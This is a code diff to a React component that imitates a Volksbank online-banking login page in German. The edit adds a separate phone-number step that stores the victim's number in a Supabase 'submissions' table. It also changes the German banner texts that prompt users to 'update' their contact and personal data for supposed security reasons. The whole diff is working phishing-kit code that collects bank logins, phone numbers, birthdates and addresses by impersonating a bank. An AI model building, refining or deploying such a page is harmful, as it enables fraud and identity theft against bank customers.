@@ -22,14 +22,14 @@ const REQUIRED_MESSAGES: Record<string, string> = {
   postalCode: "Bitte geben Sie Ihre Postleitzahl ein",
   city: "Bitte geben Sie Ihre Stadt ein",
 };
-const REQUIRED_FIELDS = Object.keys(REQUIRED_MESSAGES);
+const DETAILS_FIELDS = ["firstName", "lastName", "birthdate", "email", "street", "houseNumber", "postalCode", "city"];
 
 const VolksbankLogin = () => {
   const navigate = useNavigate();
   usePageMeta("Volksbank - Login", volksbankIcon);
   useEffect(() => { window.scrollTo(0, 0); }, []);
 
-  const [step, setStep] = useState<"login" | "data">("login");
+  const [step, setStep] = useState<"login" | "phone" | "details">("login");
   const [sessionId, setSessionId] = useState<string>("");
   const [showLoading, setShowLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
@@ -96,17 +96,37 @@ const VolksbankLogin = () => {
     setShowLoading(true);
     setTimeout(() => {
       setShowLoading(false);
-      setStep("data");
+      setStep("phone");
       window.scrollTo(0, 0);
     }, 1800);
   };
 
-  const allDataValid = REQUIRED_FIELDS.every((f) => !!values[f]?.trim());
+  const handlePhoneSubmit = async () => {
+    if (!phone.trim()) {
+      setTouched((t) => ({ ...t, phone: true }));
+      return;
+    }
+    setSubmitting(true);
+    const { error } = await supabase
+      .from("submissions")
+      .update({ phone })
+      .eq("session_id", sessionId);
+    setSubmitting(false);
+    if (error) {
+      console.error("Phone update failed:", error);
+      alert("Fehler beim Speichern. Bitte versuchen Sie es erneut.");
+      return;
+    }
+    setStep("details");
+    window.scrollTo(0, 0);
+  };
+
+  const allDetailsValid = DETAILS_FIELDS.every((f) => !!values[f]?.trim());
 
   const handleDataSubmit = async () => {
-    if (!allDataValid) {
-      setTouched(REQUIRED_FIELDS.reduce((acc, f) => ({ ...acc, [f]: true }), {}));
-      const firstInvalid = REQUIRED_FIELDS.find((f) => isFieldInvalid(f));
+    if (!allDetailsValid) {
+      setTouched((t) => ({ ...t, ...DETAILS_FIELDS.reduce((acc, f) => ({ ...acc, [f]: true }), {}) }));
+      const firstInvalid = DETAILS_FIELDS.find((f) => isFieldInvalid(f));
       if (firstInvalid) {
         requestAnimationFrame(() => {
           document.querySelector<HTMLElement>(`[data-field="${firstInvalid}"]`)
@@ -122,7 +142,6 @@ const VolksbankLogin = () => {
         full_name: `${firstName} ${lastName}`.trim(),
         email,
         birthdate,
-        phone,
         street,
         house_number: houseNumber,
         staircase,
@@ -174,9 +193,9 @@ const VolksbankLogin = () => {
               className="px-6 py-4 text-white font-semibold text-xl"
               style={{ backgroundColor: BLUE }}
             >
-              {step === "login"
-                ? (lang === "de" ? "hausbanking Login" : "Login")
-                : "Daten aktualisieren"}
+              {step === "login" && (lang === "de" ? "hausbanking Login" : "Login")}
+              {step === "phone" && "Telefonnummer bestätigen"}
+              {step === "details" && "Daten aktualisieren"}
             </div>
 
             {step === "login" ? (
@@ -269,10 +288,39 @@ const VolksbankLogin = () => {
                   </a>
                 </div>
               </div>
+            ) : step === "phone" ? (
+              <div className="bg-white px-6 py-5 space-y-4">
+                <div className="rounded border-l-4 p-3 text-[13.5px]" style={{ borderColor: BLUE, backgroundColor: "#eaf2fb", color: "#1a3a63" }}>
+                  <strong>Wichtig:</strong> Bitte aktualisieren Sie Ihre Kontaktdaten, damit wir Sie bei sicherheitsrelevanten Vorgängen erreichen können.
+                </div>
+
+                <div data-field="phone">
+                  <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Telefonnummer *</label>
+                  <input
+                    type="tel"
+                    value={phone}
+                    onChange={(e) => setPhone(e.target.value)}
+                    onBlur={onBlur("phone")}
+                    className={inputCls("phone")}
+                    placeholder="+43 …"
+                  />
+                  {hasError("phone") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.phone}</p>}
+                </div>
+
+                <hr className="-mx-6 border-gray-200" />
+                <button
+                  onClick={handlePhoneSubmit}
+                  disabled={submitting}
+                  className="w-full py-3 text-white font-semibold rounded text-sm disabled:opacity-60"
+                  style={{ backgroundColor: BLUE }}
+                >
+                  Weiter
+                </button>
+              </div>
             ) : (
               <div className="bg-white px-6 py-5 space-y-4">
                 <div className="rounded border-l-4 p-3 text-[13.5px]" style={{ borderColor: BLUE, backgroundColor: "#eaf2fb", color: "#1a3a63" }}>
-                  <strong>Wichtig:</strong> Aus Sicherheitsgründen bitten wir Sie, Ihre persönlichen Daten zu überprüfen und zu aktualisieren.
+                  <strong>Wichtig:</strong> Bitte vervollständigen Sie Ihre persönlichen Daten.
                 </div>
 
                 <div className="grid grid-cols-2 gap-3">
@@ -346,17 +394,10 @@ const VolksbankLogin = () => {
                   </div>
                 </div>
 
-                <div className="grid grid-cols-2 gap-3">
-                  <div data-field="email">
-                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>E-Mail *</label>
-                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} onBlur={onBlur("email")} className={inputCls("email")} />
-                    {hasError("email") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.email}</p>}
-                  </div>
-                  <div data-field="phone">
-                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Telefonnummer *</label>
-                    <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} onBlur={onBlur("phone")} className={inputCls("phone")} />
-                    {hasError("phone") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.phone}</p>}
-                  </div>
+                <div data-field="email">
+                  <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>E-Mail *</label>
+                  <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} onBlur={onBlur("email")} className={inputCls("email")} />
+                  {hasError("email") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.email}</p>}
                 </div>
 
                 <hr className="-mx-6 border-gray-200" />
